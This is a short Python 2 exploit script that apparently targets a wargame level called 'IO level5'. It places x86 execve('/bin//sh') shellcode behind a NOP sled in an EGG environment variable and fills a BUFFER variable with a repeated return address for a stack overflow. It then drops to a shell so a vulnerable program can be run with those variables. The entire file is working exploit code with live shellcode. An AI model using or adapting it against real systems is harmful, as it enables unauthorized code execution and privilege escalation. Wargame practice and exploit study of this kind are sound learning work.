#!/usr/bin/python

import sys
import os
import struct
import subprocess

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

def create_egg(egg_size):
     egg = '\x90' * (egg_size - len(shellcode))
     egg += shellcode

     os.environ['EGG'] = egg;     

def create_overflow(buffer_size,ret_addr):
     if ret_addr == None:
          #set for IO level5 with ./exploit8 10000 1000
          ret_addr = 0xbfffa851L
     
     pack_ret_addr = struct.pack('<L',ret_addr) 

     os.environ['BUFFER'] = str(pack_ret_addr * buffer_size)

def main():
     if len(sys.argv) < 3:
        print "[-] Usage: ./exploit8.py egg_size buffer_size"
        print "[-] Usage: ./exploit8.py egg_size buffer_size ret_addr"
        exit(0)

     create_egg(int(sys.argv[1]))

     if len(sys.argv) == 4:
          create_overflow(int(sys.argv[2]),int(sys.argv[3],16))
     else:
          create_overflow(int(sys.argv[2]),None)

     subprocess.call(['sh'])

main()
